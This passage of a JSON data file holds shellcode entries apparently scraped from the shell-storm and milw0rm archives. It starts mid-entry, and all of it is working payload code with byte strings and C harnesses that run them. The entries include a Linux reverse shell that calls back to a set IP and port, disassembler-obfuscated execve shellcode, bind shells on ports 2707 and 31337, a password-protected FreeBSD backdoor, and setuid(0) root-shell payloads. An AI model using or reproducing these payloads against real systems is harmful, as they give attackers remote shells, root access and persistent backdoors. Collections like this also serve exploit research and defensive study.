%eax,%esi\t\t# now %esi holds s fileDescriptor [for connect()]", "push   $0x3\t\t\t#", "pop    %ebx\t\t\t# connect() = 3", "push   $0x66\t\t\t#", "pop    %eax\t\t\t# 0x66 = socketcall", "int    $0x80\t\t\t# On success %eax = 0", "", "# dup2(s, 2) , dup2(s, 1) , dup2(s, 0)", "xchg   %esi,%ebx        \t# Put s fileDescriptor on %ebx [for dup2()]", "push   $0x2", "pop    %ecx", "dup_loop:", "mov    $0x3f,%al\t\t# dup2() = 0x3f", "int    $0x80", "dec    %ecx", "jns    dup_loop", "", "# execve(\"/bin//sh\", [\"/bin//sh\",NULL])", "mov    $0xb,%al\t\t\t# execve = 11d", "xor    %edx,%edx", "push   %edx", "push   $0x68732f2f", "push   $0x6e69622f", "mov    %esp,%ebx", "push   %edx", "push   %ebx", "mov    %esp, %ecx", "int    $0x80", "", "*----------------------------------------------------------------------------*/", "", "char sc[] =", "\"\\x6a\\x66\"                \t\t//push   $0x66", "\"\\x58\"                   \t\t//pop    %eax", "\"\\x6a\\x01\"                \t\t//push   $0x1", "\"\\x5b\"                   \t\t//pop    %ebx", "\"\\x31\\xc9\"                \t\t//xor    %ecx,%ecx", "\"\\x51\"                   \t\t//push   %ecx", "\"\\x6a\\x01\"                \t\t//push   $0x1", "\"\\x6a\\x02\"                \t\t//push   $0x2", "\"\\x89\\xe1\"                \t\t//mov    %esp,%ecx", "\"\\xcd\\x80\"                \t\t//int    $0x80", "\"\\x68\\x7f\\x7f\\x7f\\x7f\"       \t\t//push   $0x7f7f7f7f\t//IP", "\"\\x66\\x68\\xfc\\xc9\"          \t\t//pushw  $0xc9fc\t//PORT", "\"\\x66\\x6a\\x02\"             \t\t//pushw  $0x2", "\"\\x89\\xe1\"                \t\t//mov    %esp,%ecx", "\"\\x6a\\x10\"                \t\t//push   $0x10", "\"\\x51\"                   \t\t//push   %ecx", "\"\\x50\"                   \t\t//push   %eax", "\"\\x89\\xe1\"                \t\t//mov    %esp,%ecx", "\"\\x89\\xc6\"                \t\t//mov    %eax,%esi", "\"\\x6a\\x03\"                \t\t//push   $0x3", "\"\\x5b\"                   \t\t//pop    %ebx", "\"\\x6a\\x66\"                \t\t//push   $0x66", "\"\\x58\"                   \t\t//pop    %eax", "\"\\xcd\\x80\"                \t\t//int    $0x80", "\"\\x87\\xf3\"                \t\t//xchg   %esi,%ebx", "\"\\x6a\\x02\"                \t\t//push   $0x2", "\"\\x59\"                   \t\t//pop    %ecx", "\"\\xb0\\x3f\"                \t\t//mov    $0x3f,%al", "\"\\xcd\\x80\"               \t\t//int    $0x80", "\"\\x49\"                   \t\t//dec    %ecx", "\"\\x79\\xf9\"                \t\t//jns    34 <dup_loop>", "\"\\xb0\\x0b\"                \t\t//mov    $0xb,%al", "\"\\x31\\xd2\"                \t\t//xor    %edx,%edx", "\"\\x52\"                   \t\t//push   %edx", "\"\\x68\\x2f\\x2f\\x73\\x68\"       \t\t//push   $0x68732f2f", "\"\\x68\\x2f\\x62\\x69\\x6e\"       \t\t//push   $0x6e69622f", "\"\\x89\\xe3\"                \t\t//mov    %esp,%ebx", "\"\\x52\"                   \t\t//push   %edx", "\"\\x53\"                   \t\t//push   %ebx", "\"\\x89\\xe1\"                \t\t//mov    %esp,%ecx", "\"\\xcd\\x80\";               \t\t//int    $0x80", "", "void SET_PORT(char *buf, int port) {", "\t*(unsigned short *)(((buf)+24)) = (port);", "\tchar tmp = buf[24];", "\tbuf[24] = buf[25];", "\tbuf[25] = tmp;", "}", "", "void SET_IP(char *buf, char *ip) {", "\tunsigned long backip = inet_addr(ip);", "\t*(unsigned long *)(((buf)+18)) = (backip);", "}", "", "main(){", "\tprintf(\"size: %d bytes\\n\", strlen(sc));", "", "\tSET_PORT(sc, 33333);", "\tSET_IP(sc, \"127.0.0.1\");", "\t__asm__(\"call sc\");", "}", "", "// milw0rm.com [2006-05-08]"]},
{"Title": "Linux/x86 - execve() + Diassembly + Obfuscation Shellcode (32 bytes)", "Author": "BaCkSpAcE", "Published": ": 2006-05-14", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-237.php", "View": null, "code": ["/*  execve() shellcode with 'fuck up disasm' ability, 32 bytes long", "    by BaCkSpAcE [sinisa86(at)gmail(dot)com]", "    BitByterz Labs 2006", "    http://www.bitbyterz.org", "", ";", "; shellcode.asm", ";", "  fupdisasm:", "    db 0x68\t\t; opcode for PUSH DW instruction", "    db 0xcd\t\t; crypt+1, opcode for INT instruction", "    db 0x80\t\t; interrupt number (80 in this case)", "    db 0x68\t\t; crypt+3", "    db 0x68", "    jmp fupdisasm+3", "    db 0x68\t\t; MAGIC_BYTE: this byte makes disasm go crazy", "", "; our shellcode which we want to hide", "    push byte 11", "    pop eax", "    xor edx, edx", "    push edx", "    push 0x68732f2f", "    push 0x6e69622f", "    mov ebx, esp", "    push edx", "    push ebx", "    mov ecx, esp", "    jmp fupdisasm+1\t; jumps on address where is hidden int 0x80", "", "", "    backspace@bitbyterz# nasm shellcode.asm", "    backspace@bitbyterz# ndisasm -u shellcode", "    00000000  68CD806868        push dword 0x686880cd", "    00000005  EBFC              jmp short 0x3", "    00000007  686A0B5831        push dword 0x31580b6a", "    0000000C  D25268            rcl byte [edx+0x68],cl", "    0000000F  2F                das", "    00000010  2F                das", "    00000011  7368              jnc 0x7b", "    00000013  682F62696E        push dword 0x6e69622f", "    00000018  89E3              mov ebx,esp", "    0000001A  52                push edx", "    0000001B  53                push ebx", "    0000001C  89E1              mov ecx,esp", "    0000001E  EBE1              jmp short 0x1", "", "    Find difference between original and dissasembled shellcode ;)", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char shellcode[] =      \"\\x68\\xcd\\x80\\x68\\x68\\xeb\\xfc\\x68\"", "\t\t\t\"\\x6a\\x0b\\x58\\x31\\xd2\\x52\\x68\\x2f\"", "\t\t\t\"\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\"", "\t\t\t\"\\x89\\xe3\\x52\\x53\\x89\\xe1\\xeb\\xe1\";", "", "main() {", "  void  (*fp) (void);", "  fp = (void *) shellcode;", "  printf (\"%d bytes\\n\", strlen(shellcode));", "  fp();", "}", "", "// milw0rm.com [2006-05-14]"]},
{"Title": "Linux/x86 - Bind (2707/TCP) Shell Shellcode (84 bytes)", "Author": "oveRet", "Published": ": 2006-07-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-235.php", "View": null, "code": ["/*", " * Shellcode - portbind (84 bytes)", " *", " *  Copyright (c) 2002 Giuseppe Gottardi 'oveRet' <overet@securitydate.it>", " *", " *  All rights reserved.", " *", " * Redistribution and use in source and binary forms, with or without", " * modification, are permitted provided that the following conditions", " * are met:", " * 1. Redistributions of source code must retain the above copyright", " *    notice, this list of conditions and the following disclaimer.", " * 2. Redistributions in binary form must reproduce the above copyright", " *    notice, this list of conditions and the following disclaimer in the", " *    documentation and/or other materials provided with the distribution.", " *", " * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND", " * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE", " * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE", " * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE", " * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL", " * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS", " * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)", " * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT", " * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY", " * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF", " * SUCH DAMAGE.", " *", " *", " * 8048304:\t6a 66                \tpush   $0x66", " * 8048306:\t58                   \tpop    %eax", " * 8048307:\t6a 01                \tpush   $0x1", " * 8048309:\t5b                   \tpop    %ebx", " * 804830a:\t99                   \tcltd   ", " * 804830b:\t52                   \tpush   %edx", " * 804830c:\t53                   \tpush   %ebx", " * 804830d:\t6a 02                \tpush   $0x2", " * 804830f:\t89 e1                \tmov    %esp,%ecx", " * 8048311:\tcd 80                \tint    $0x80", " * 8048313:\t52                   \tpush   %edx", " * 8048314:\t43                   \tinc    %ebx", " * 8048315:\t68 ff 02 0a 93       \tpush   $0x930a02ff", " * 804831a:\t89 e1                \tmov    %esp,%ecx", " * 804831c:\t6a 10                \tpush   $0x10", " * 804831e:\t51                   \tpush   %ecx", " * 804831f:\t50                   \tpush   %eax", " * 8048320:\t89 e1                \tmov    %esp,%ecx", " * 8048322:\t89 c6                \tmov    %eax,%esi", " * 8048324:\tb0 66                \tmov    $0x66,%al", " * 8048326:\tcd 80                \tint    $0x80", " * 8048328:\t43                   \tinc    %ebx", " * 8048329:\t43                   \tinc    %ebx", " * 804832a:\tb0 66                \tmov    $0x66,%al", " * 804832c:\tcd 80                \tint    $0x80", " * 804832e:\t52                   \tpush   %edx", " * 804832f:\t56                   \tpush   %esi", " * 8048330:\t89 e1                \tmov    %esp,%ecx", " * 8048332:\t43                   \tinc    %ebx", " * 8048333:\tb0 66                \tmov    $0x66,%al", " * 8048335:\tcd 80                \tint    $0x80", " * 8048337\t89 d9\t\t\tmov    %ebx,%ecx", " * 8048339:\t89 c3                \tmov    %eax,%ebx", " * 804833b:\tb0 3f                \tmov    $0x3f,%al", " * 804833d:\t49                   \tdec    %ecx", " * 804833e:\tcd 80                \tint    $0x80", " * 8048340:\t41                   \tinc    %ecx", " * 8048341:\te2 f8                \tloop   804833b", " * 8048343:\t52                   \tpush   %edx", " * 8048344:\t68 6e 2f 73 68       \tpush   $0x68732f6e", " * 8048349:\t68 2f 2f 62 69       \tpush   $0x69622f2f", " * 804834e:\t89 e3                \tmov    %esp,%ebx", " * 8048350:\t52                   \tpush   %edx", " * 8048351:\t53                   \tpush   %ebx", " * 8048352:\t89 e1                \tmov    %esp,%ecx", " * 8048354:\tb0 0b                \tmov    $0xb,%al", " * 8048356:\tcd 80                \tint    $0x80", " *", "*/", "", "#include <stdio.h>", "#define L_PORT \"\\x0a\\x93\"\t/* Port 2707 */", "", "char shellcode[] = \"\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x99\\x52\\x53\\x6a\\x02\\x89\"", "                   \"\\xe1\\xcd\\x80\\x52\\x43\\x68\\xff\\x02\"L_PORT\"\\x89\\xe1\"", "                   \"\\x6a\\x10\\x51\\x50\\x89\\xe1\\x89\\xc6\\xb0\\x66\\xcd\\x80\"", "                   \"\\x43\\x43\\xb0\\x66\\xcd\\x80\\x52\\x56\\x89\\xe1\\x43\\xb0\"", "                   \"\\x66\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x3f\\x49\\xcd\\x80\"", "                   \"\\x41\\xe2\\xf8\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\"", "                   \"\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "main()", "{", "\tvoid (*f)();", "\t(long) f = &shellcode; ", "\tfprintf(stdout, \"lenght: %d bytes\\n\", sizeof(shellcode) - 1);", "\tf(); ", "}", "", "// milw0rm.com [2006-07-04]"]},
{"Title": "FreeBSD/x86 - Bind (4883/TCP) Shell (/bin/sh) + Password Shellcode (222 bytes)", "Author": "MahDelin", "Published": ": 2006-07-19", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-169.php", "View": null, "code": ["/*", "THE ZUGCODE - SMALL REMOTE 6ACKD0R", "FreeBSD i386 bind shell with auth", "code by MahDelin", "Big thx SST [kaka, nolife, white]", "Listen on the port 4883 the /bin/sh", "*/", "", "/*", "void zugcode(void )", "{", "//socket", "__asm__(\"xorl     %eax,  %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"pushl    $0x01\");", "__asm__(\"pushl    $0x02\");", "__asm__(\"movl     %esp,  %ebp\");", "__asm__(\"pushl    %ebp\");", "__asm__(\"movb     $0x61, %al\");", "__asm__(\"int      $0x80\");", "", "//struct sockaddr_in", "__asm__(\"movl     %eax,    %edi\");", "__asm__(\"xorl     %eax,    %eax\");", "__asm__(\"movb     $0x02,   9(%ebp)\");", "__asm__(\"movw     $0x1313, 10(%ebp)\");", "__asm__(\"movl     %eax,    12(%ebp)\");", "__asm__(\"leal     8(%ebp), %ecx\");", "", "//bind", "__asm__(\"xor      %ebx,%ebx\");", "__asm__(\"movb     $0x10,%bl\");", "__asm__(\"push     %ebx\");", "__asm__(\"push     %ecx\");", "__asm__(\"push     %edi\");", "__asm__(\"push     %eax\");", "__asm__(\"movb     $0x68, %al\");", "__asm__(\"int      $0x80\");", "", "//listen", "__asm__(\"xor      %eax, %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"pushl    $0x01\");", "__asm__(\"pushl    %edi\");", "__asm__(\"pushl    %eax\");", "__asm__(\"movb     $0x6a, %al\");", "__asm__(\"int      $0x80\");", "", "//accept", "__asm__(\"xor      %eax, %eax\");", "__asm__(\"push     %ebx\");", "__asm__(\"pushl    %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"pushl    %edi\");", "__asm__(\"pushl    %eax\");", "__asm__(\"movb     $0x1e, %al\");", "__asm__(\"int      $0x80\");", "", "__asm__(\"mov      %eax, %esi\");", "__asm__(\"xor       %eax, %eax\");", "__asm__(\"pushl     $0x203a7465\");", "__asm__(\"pushl     $0x72636573\");", "__asm__(\"movl      %esp, %ebx\");", "__asm__(\"push      %eax\");", "__asm__(\"push      $0x8\");", "__asm__(\"pushl     %ebx\");", "__asm__(\"push      %esi\");", "__asm__(\"xor       %eax, %eax\");", "__asm__(\"push      %eax\");", "__asm__(\"movb     $0x65, %al\");", "__asm__(\"int      $0x80\");", "", "//rcev password", "__asm__(\"xor      %eax, %eax\");", "__asm__(\"pushl    %ebp\");", "__asm__(\"movl     %esp, %ebp\");", "__asm__(\"movb     $0x20, %al\");", "__asm__(\"subl     %eax,  %esp\");", "__asm__(\"xor      %eax, %eax\");", "__asm__(\"push     %eax\");", "__asm__(\"mov      $0x80, %al\");", "__asm__(\"push     %eax\");", "__asm__(\"xor      %eax, %eax\");", "__asm__(\"push     %ebp\");", "__asm__(\"push     %esi\");", "__asm__(\"push     %eax\");", "__asm__(\"movb     $0x66, %al\");", "__asm__(\"int      $0x80\");", "", "//compare password", "//save registers %esi, %edi", "__asm__(\"mov     %edi, %ebx\");", "__asm__(\"mov     %esi, %edx\");", "__asm__(\"mov     %eax, %ecx\");", "__asm__(\".word    0x50eb\");", "__asm__(\"pop      %esi\");", "__asm__(\"mov      %ebp,     %edi\");", "__asm__(\"repe    cmpsb\");", "__asm__(\".word    0x4275\");", "__asm__(\"mov     %ebx, %edi\");", "__asm__(\"mov     %edx, %esi\");", "", "//dup2 stdin", "__asm__(\"xorl     %eax,  %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"pushl    %esi\");", "__asm__(\"pushl    %eax\");", "__asm__(\"movb     $0x5a, %al\");", "__asm__(\"int      $0x80\");", "", "//dup2 stdout", "__asm__(\"xorl     %eax,  %eax\");", "__asm__(\"inc      %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"pushl    %esi\");", "__asm__(\"xorl     %eax,  %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"movb     $0x5a, %al\");", "__asm__(\"int      $0x80\");", "", "//dup2 stderr", "__asm__(\"xorl     %eax,  %eax\");", "__asm__(\"add      $0x2,  %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"pushl    %esi\");", "__asm__(\"xorl     %eax,  %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"movb     $0x5a, %al\");", "__asm__(\"int      $0x80\");", "", "// /bin/sh", "__asm__(\"xor      %ecx, %ecx\");", "__asm__(\"pushl    %ecx\");", "__asm__(\"pushl    $0x68732f2f\");", "__asm__(\"pushl    $0x6e69622f\");", "__asm__(\"movl     %esp, %ebx\");", "__asm__(\"pushl    %ecx\");", "__asm__(\"pushl    %ebx\");", "__asm__(\"movl     %esp, %edx\");", "__asm__(\"pushl    %ecx\");", "__asm__(\"pushl    %edx\");", "__asm__(\"pushl    %ebx\");", "__asm__(\"pushl    %ecx\");", "__asm__(\"movb     $0x3b, %al\");", "__asm__(\"int      $0x80\");", "", "//exit", "__asm__(\"xorl     %eax,  %eax\");", "__asm__(\"inc      %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"pushl    %eax\");", "__asm__(\"int      $0x80\");", "", "__asm__(\".byte  0xe8\");", "__asm__(\".long  0xffffffab\");", "__asm__(\".asciz \\\"payhash\\12\\\"\");", "}", "*/", "", "unsigned char zug[] =", "\"\\x31\\xc0\\x50\\x50\\x6a\\x01\\x6a\\x02\\x89\\xe5\\x55\\xb0\\x61\\xcd\\x80\\x89\\xc7\\x31\"", "\"\\xc0\\xc6\\x45\\x09\\x02\\x66\\xc7\\x45\\x0a\\x13\\x13\\x89\\x45\\x0c\\x8d\\x4d\\x08\\x31\"", "\"\\xdb\\xb3\\x10\\x53\\x51\\x57\\x50\\xb0\\x68\\xcd\\x80\\x31\\xc0\\x50\\x6a\\x01\\x57\\x50\"", "\"\\xb0\\x6a\\xcd\\x80\\x31\\xc0\\x53\\x50\\x50\\x57\\x50\\xb0\\x1e\\xcd\\x80\\x89\\xc6\\x31\"", "\"\\xc0\\x68\\x65\\x74\\x3a\\x20\\x68\\x73\\x65\\x63\\x72\\x89\\xe3\\x50\\x6a\\x08\\x53\\x56\"", "\"\\x31\\xc0\\x50\\xb0\\x65\\xcd\\x80\\x31\\xc0\\x55\\x89\\xe5\\xb0\\x20\\x29\\xc4\\x31\\xc0\"", "\"\\x50\\xb0\\x80\\x50\\x31\\xc0\\x55\\x56\\x50\\xb0\\x66\\xcd\\x80\\x89\\xfb\\x89\\xf2\\x89\"", "\"\\xc1\\xeb\\x50\\x5e\\x89\\xef\\xf3\\xa6\\x75\\x42\\x89\\xdf\\x89\\xd6\\x31\\xc0\\x50\\x56\"", "\"\\x50\\xb0\\x5a\\xcd\\x80\\x31\\xc0\\x40\\x50\\x56\\x31\\xc0\\x50\\xb0\\x5a\\xcd\\x80\\x31\"", "\"\\xc0\\x83\\xc0\\x02\\x50\\x56\\x31\\xc0\\x50\\xb0\\x5a\\xcd\\x80\\x31\\xc9\\x51\\x68\\x2f\"", "\"\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x53\\x89\\xe2\\x51\\x52\\x53\\x51\"", "\"\\xb0\\x3b\\xcd\\x80\\x31\\xc0\\x40\\x50\\x50\\xcd\\x80\\xe8\\xab\\xff\\xff\\xff\\x70\\x61\"", "\"\\x79\\x68\\x61\\x73\\x68\\x0a\";", "", "main()", "{", "int (*zugcode)();", "printf(\"shellcode len, %d bytes\\n\", strlen(zug));", "zugcode = (int (*)()) zug;", "(int)(*zugcode)();", "}", "", "// milw0rm.com [2006-07-19]"]},
{"Title": "BSD/x86 - setuid(0) + execve(/bin/sh) Shellcode (30 bytes)", "Author": "Marco Ivaldi", "Published": ": 2006-07-20", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-95.php", "View": null, "code": ["/*", " * $Id: setuid-bsd.c,v 1.6 2004/06/02 12:22:30 raptor Exp $", " *", " * setuid-bsd.c - setuid/execve shellcode for *BSD/x86", " * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>", " *", " * Short setuid(0) and /bin/sh execve() shellcode (based on esdee's code).", " *", " * Tested on OpenBSD and FreeBSD.", " */", "", "/*", " * setuid(0)", " *", " * 20c8:       31 c0                   xor    %eax,%eax", " * 20ca:       50                      push   %eax", " * 20cb:       50                      push   %eax", " * 20cc:       b0 17                   mov    $0x17,%al", " * 20ce:       cd 80                   int    $0x80", " *", " * execve(\"/bin/sh\", [\"/bin/sh\"], NULL)", " *", " * 20d0:       31 c0                   xor    %eax,%eax", " * 20d2:       50                      push   %eax", " * 20d3:       68 2f 2f 73 68          push   $0x68732f2f", " * 20d8:       68 2f 62 69 6e          push   $0x6e69622f", " * 20dd:       89 e3                   mov    %esp,%ebx", " * 20df:       50                      push   %eax", " * 20e0:       54                      push   %esp", " * 20e1:       53                      push   %ebx", " * 20e2:       50                      push   %eax", " * 20e3:       b0 3b                   mov    $0x3b,%al", " * 20e5:       cd 80                   int    $0x80", " */", "", "char sc[] = /* 7 + 23 = 30 bytes */", "\"\\x31\\xc0\\x50\\x50\\xb0\\x17\\xcd\\x80\"", "\"\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x54\\x53\\x50\\xb0\\x3b\\xcd\\x80\";", "", "main()", "{", "\tint (*f)() = (int (*)())sc; f();", "}", "", "// milw0rm.com [2006-07-20]"]},
{"Title": "BSD/x86 - setuid(0) + Bind (31337/TCP) Shell Shellcode (94 bytes)", "Author": "Marco Ivaldi", "Published": ": 2006-07-20", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-94.php", "View": null, "code": ["/*", " * $Id: portbind-bsd.c,v 1.3 2004/06/02 12:22:30 raptor Exp $", " *", " * portbind-bsd.c - setuid/portbind shellcode for *BSD/x86", " * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>", " *", " * Simple portbind shellcode that bind()'s a setuid(0) shell on", " * port 31337/tcp (based on bighawk's code).", " *", " * Tested on OpenBSD and FreeBSD.", " */", "", "/*", " * setuid(0)", " *", " * 20c8:       31 c0                   xor    %eax,%eax", " * 20ca:       50                      push   %eax", " * 20cb:       50                      push   %eax", " * 20cc:       b0 17                   mov    $0x17,%al", " * 20ce:       cd 80                   int    $0x80", " *", " * socket(AF_INET, SOCK_STREAM, 0)", " *", " * 20d0:       31 c9                   xor    %ecx,%ecx", " * 20d2:       f7 e1                   mul    %ecx,%eax", " * 20d4:       51                      push   %ecx", " * 20d5:       41                      inc    %ecx", " * 20d6:       51                      push   %ecx", " * 20d7:       41                      inc    %ecx", " * 20d8:       51                      push   %ecx", " * 20d9:       51                      push   %ecx", " * 20da:       b0 61                   mov    $0x61,%al", " * 20dc:       cd 80                   int    $0x80", " *", " * bind(s, server, sizeof(server))", " *", " * 20de:       89 c3                   mov    %eax,%ebx", " * 20e0:       52                      push   %edx", " * 20e1:       66 68 7a 69             pushw  $0x697a", " * 20e5:       66 51                   push   %cx", " * 20e7:       89 e6                   mov    %esp,%esi", " * 20e9:       b1 10                   mov    $0x10,%cl", " * 20eb:       51                      push   %ecx", " * 20ec:       56                      push   %esi", " * 20ed:       50                      push   %eax", " * 20ee:       50                      push   %eax", " * 20ef:       b0 68                   mov    $0x68,%al", " * 20f1:       cd 80                   int    $0x80", " *", " * listen(s, 1)", " *", " * 20f3:       51                      push   %ecx", " * 20f4:       53                      push   %ebx", " * 20f5:       53                      push   %ebx", " * 20f6:       b0 6a                   mov    $0x6a,%al", " * 20f8:       cd 80                   int    $0x80", " *", " * accept(s, 0, 0)", " *", " * 20fa:       52                      push   %edx", " * 20fb:       52                      push   %edx", " * 20fc:       53                      push   %ebx", " * 20fd:       53                      push   %ebx", " * 20fe:       b0 1e                   mov    $0x1e,%al", " * 2100:       cd 80                   int    $0x80", " *", " * dup2(c, 2)", " * dup2(c, 1)", " * dup2(c, 0)", " *", " * 2102:       b1 03                   mov    $0x3,%cl", " * 2104:       89 c3                   mov    %eax,%ebx", " * 2106:       b0 5a                   mov    $0x5a,%al", " * 2108:       49                      dec    %ecx", " * 2109:       51                      push   %ecx", " * 210a:       53                      push   %ebx", " * 210b:       53                      push   %ebx", " * 210c:       cd 80                   int    $0x80", " * 210e:       41                      inc    %ecx", " * 210f:       e2 f5                   loop   2106 <_sc+0x3e>", " *", " * execve(\"/bin/sh\", [\"/bin/sh\"], NULL)", " *", " * 2111:       51                      push   %ecx", " * 2112:       68 2f 2f 73 68          push   $0x68732f2f", " * 2117:       68 2f 62 69 6e          push   $0x6e69622f", " * 211c:       89 e3                   mov    %esp,%ebx", " * 211e:       51                      push   %ecx", " * 211f:       54                      push   %esp", " * 2120:       53                      push   %ebx", " * 2121:       53                      push   %ebx", " * 2122:       b0 3b                   mov    $0x3b,%al", " * 2124:       cd 80                   int    $0x80", " */", "", "char sc[] = /* 8 + 86 = 94 bytes */", "\"\\x31\\xc0\\x50\\x50\\xb0\\x17\\xcd\\x80\"", "\"\\x31\\xc9\\xf7\\xe1\\x51\\x41\\x51\\x41\\x51\\x51\\xb0\\x61\\xcd\\x80\"", "\"\\x89\\xc3\\x52\\x66\\x68\"", "\"\\x7a\\x69\" // port 31337/tcp, change if needed", "\"\\x66\\x51\\x89\\xe6\\xb1\\x10\\x51\\x56\\x50\\x50\\xb0\\x68\\xcd\\x80\"", "\"\\x51\\x53\\x53\\xb0\\x6a\\xcd\\x80\"", "\"\\x52\\x52\\x53\\x53\\xb0\\x1e\\xcd\\x80\"", "\"\\xb1\\x03\\x89\\xc3\\xb0\\x5a\\x49\\x51\\x53\\x53\\xcd\\x80\"", "\"\\x41\\xe2\\xf5\\x51\\x68//sh\\x68/bin\\x89\\xe3\\x51\\x54\\x53\\x53\\xb0\\x3b\\xcd\\x80\";", "", "main()", "{", "\tint (*f)() = (int (*)())sc; f();", "}", "", "// milw0rm.com [2006-07-20]"]},
{"Title": "Linux/x86 - stdin re-open + /bin/sh exec Shellcode (39 bytes)", "Author": "Marco Ivaldi", "Published": ": 2006-07-20", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-219.php", "View": null, "code": ["/*", " * $Id: gets-linux.c,v 1.3 2004/06/02 12:22:30 raptor Exp $", " *", " * gets-linux.c - stdin re-open shellcode for Linux/x86", " * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>", " *", " * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin ", " * descriptor and re-opens /dev/tty, then does an execve() of /bin/sh.", " * Useful to exploit some gets() buffer overflows in an elegant way...", " */", "", "/*", " * close(0) ", " *", " * 8049380:       31 c0                   xor    %eax,%eax", " * 8049382:       31 db                   xor    %ebx,%ebx", " * 8049384:       b0 06                   mov    $0x6,%al", " * 8049386:       cd 80                   int    $0x80", " *", " * open(\"/dev/tty\", O_RDWR | ...)", " *", " * 8049388:       53                      push   %ebx", " * 8049389:       68 2f 74 74 79          push   $0x7974742f", " * 804938e:       68 2f 64 65 76          push   $0x7665642f", " * 8049393:       89 e3                   mov    %esp,%ebx", " * 8049395:       31 c9                   xor    %ecx,%ecx", " * 8049397:       66 b9 12 27             mov    $0x2712,%cx", " * 804939b:       b0 05                   mov    $0x5,%al", " * 804939d:       cd 80                   int    $0x80", " *", " * execve(\"/bin/sh\", [\"/bin/sh\"], NULL)", " *", " * 804939f:       31 c0                   xor    %eax,%eax", " * 80493a1:       50                      push   %eax", " * 80493a2:       68 2f 2f 73 68          push   $0x68732f2f", " * 80493a7:       68 2f 62 69 6e          push   $0x6e69622f", " * 80493ac:       89 e3                   mov    %esp,%ebx", " * 80493ae:       50                      push   %eax", " * 80493af:       53                      push   %ebx", " * 80493b0:       89 e1                   mov    %esp,%ecx", " * 80493b2:       99                      cltd   ", " * 80493b3:       b0 0b                   mov    $0xb,%al", " * 80493b5:       cd 80                   int    $0x80", " */", "", "char sc[] = ", "\"\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\"", "\"\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\"", "\"\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\";", "", "main()", "{", "\tint (*f)() = (int (*)())sc; f();", "}", "", "// milw0rm.com [2006-07-20]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Re-Use Of Strings In .rodata Shellcode (16 bytes)", "Author": "Marco Ivaldi", "Published": ": 2006-07-20", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-218.php", "View": null, "code": ["/*", " * $Id: reusage-linux.c,v 1.3 2004/01/30 20:08:46 raptor Exp $", " *", " * reusage-linux.c - re-use of \"/bin/sh\" string in .rodata", " * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>", " *", " * Short local shellcode for /bin/sh execve(). It re-uses the \"/bin/sh\"", " * string stored in the .rodata section of the vulnerable program. Change", " * the string address as needed (based on zillion's original idea).", " */", "", "/*", " * execve(\"/bin/sh\", [\"/bin/sh\"], NULL)", " *", " * 8049368:       31 c0                   xor    %eax,%eax", " * 804936a:       bb 08 84 04 08          mov    $0x8048408,%ebx # change it", " * 804936f:       53                      push   %ebx", " * 8049370:       89 e1                   mov    %esp,%ecx", " * 8049372:       31 d2                   xor    %edx,%edx", " * 8049374:       b0 0b                   mov    $0xb,%al", " * 8049376:       cd 80                   int    $0x80", " * 8049378:       00 00                   add    %al,(%eax)", " */", "", "char sc[] = /* 16 bytes */", "\"\\x31\\xc0\\xbb\\x08\\x84\\x04\\x08\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\";", "", "main()", "{", "\tint (*f)() = (int (*)())sc; f();", "}", "", "// milw0rm.com [2006-07-20]"]},
